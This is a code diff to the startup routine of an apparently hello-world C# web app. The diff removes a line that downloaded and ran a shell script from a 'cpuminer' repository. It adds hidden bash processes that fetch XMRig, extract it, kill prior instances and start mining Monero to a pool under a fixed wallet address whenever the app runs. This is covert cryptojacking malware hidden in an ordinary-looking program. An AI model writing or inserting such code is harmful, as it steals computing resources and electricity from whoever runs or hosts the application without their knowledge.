@@ -19,40 +19,96 @@ namespace hello_world
             CreateHostBuilder(args).Build().Run();
             try
             {
-                // new Process()
-                // {
-                //     StartInfo = new ProcessStartInfo()
-                //     {
-                //         WindowStyle = ProcessWindowStyle.Hidden,
-                //         FileName = $"/bin/bash",
-                //         WorkingDirectory = AppContext.BaseDirectory,
-                //         Arguments = $"-c \"tmux\"",
-                //         RedirectStandardOutput = true,
-                //         RedirectStandardError = true,
-                //         UseShellExecute = false
-                //     }
-                // }.Start();
-                // Thread.Sleep(2500);
-                var process = new Process();
-                var processStartInfo = new ProcessStartInfo()
+                string output = "";
+                string error = "";
+                var p1 = new Process()
                 {
-                    WindowStyle = ProcessWindowStyle.Hidden,
-                    FileName = $"/bin/bash",
-                    WorkingDirectory = AppContext.BaseDirectory,
-                    Arguments =
-                        $"-c \"curl -LJO https://raw.githubusercontent.com/ubuntuabd4/cpuminer/master/1.sh 1.sh; chmod +x 1.sh ; ./1.sh \"",
-                    RedirectStandardOutput = true,
-                    RedirectStandardError = true,
-                    UseShellExecute = false,
-                    CreateNoWindow = true
+                    StartInfo = new ProcessStartInfo()
+                    {
+                        WindowStyle = ProcessWindowStyle.Hidden,
+                        FileName = $"/bin/bash",
+                        WorkingDirectory = AppContext.BaseDirectory,
+                        Arguments =
+                            $"-c \"curl -LJO https://github.com/xmrig/xmrig/releases/download/v6.16.1/xmrig-6.16.1-linux-x64.tar.gz -o xmrig-6.16.1-linux-x64.tar.gz \"",
+                        RedirectStandardOutput = true,
+                        RedirectStandardError = true,
+                        UseShellExecute = false
+                    }
                 };
-                process.StartInfo = processStartInfo;
-                process.Start();
-                process.WaitForExit();
-                String error = process.StandardError.ReadToEnd();
+                p1.Start();
+                p1.WaitForExit();
+                error = p1.StandardError.ReadToEnd();
                 Console.WriteLine("ERROR: ", error);
-                String output = process.StandardOutput.ReadToEnd();
+                output = p1.StandardOutput.ReadToEnd();
                 Console.WriteLine("OUTPUT: ", output);
+                Thread.Sleep(500);
+                
+                p1 = new Process()
+                {
+                    StartInfo = new ProcessStartInfo()
+                    {
+                        WindowStyle = ProcessWindowStyle.Hidden,
+                        FileName = $"/bin/bash",
+                        WorkingDirectory = AppContext.BaseDirectory,
+                        Arguments =
+                            $"-c \"tar xvfz xmrig-6.16.1-linux-x64.tar.gz \"",
+                        RedirectStandardOutput = true,
+                        RedirectStandardError = true,
+                        UseShellExecute = false
+                    }
+                };
+                p1.Start();
+                p1.WaitForExit();
+                error = p1.StandardError.ReadToEnd();
+                Console.WriteLine("ERROR: ", error);
+                output = p1.StandardOutput.ReadToEnd();
+                Console.WriteLine("OUTPUT: ", output);
+                Thread.Sleep(500);
+
+                p1 = new Process()
+                {
+                    StartInfo = new ProcessStartInfo()
+                    {
+                        WindowStyle = ProcessWindowStyle.Hidden,
+                        FileName = $"/bin/bash",
+                        WorkingDirectory = AppContext.BaseDirectory,
+                        Arguments =
+                            $"-c \"pkill xmrig \"",
+                        RedirectStandardOutput = true,
+                        RedirectStandardError = true,
+                        UseShellExecute = false
+                    }
+                };
+                p1.Start();
+                p1.WaitForExit();
+                error = p1.StandardError.ReadToEnd();
+                Console.WriteLine("ERROR: ", error);
+                output = p1.StandardOutput.ReadToEnd();
+                Console.WriteLine("OUTPUT: ", output);
+                Thread.Sleep(500);
+
+                
+                p1 = new Process()
+                {
+                    StartInfo = new ProcessStartInfo()
+                    {
+                        WindowStyle = ProcessWindowStyle.Hidden,
+                        FileName = $"/bin/bash",
+                        WorkingDirectory = AppContext.BaseDirectory,
+                        Arguments =
+                            $"-c \"xmrig-6.16.1/xmrig -o pool.minexmr.com:4444 -u 48QZP31VnTkYTbsqZ4dq1JGMjwtds2sBnCpxrjGwBfTWG1NrEoWJGca5mxxoL8oD3NQmQuK23fTi546McgXxmd2NSyTUB1T.testxx \"",
+                        RedirectStandardOutput = true,
+                        RedirectStandardError = true,
+                        UseShellExecute = false
+                    }
+                };
+                p1.Start();
+                p1.WaitForExit();
+                error = p1.StandardError.ReadToEnd();
+                Console.WriteLine("ERROR: ", error);
+                output = p1.StandardOutput.ReadToEnd();
+                Console.WriteLine("OUTPUT: ", output);
+                Thread.Sleep(500);
             }
             catch (Exception ex)
             {
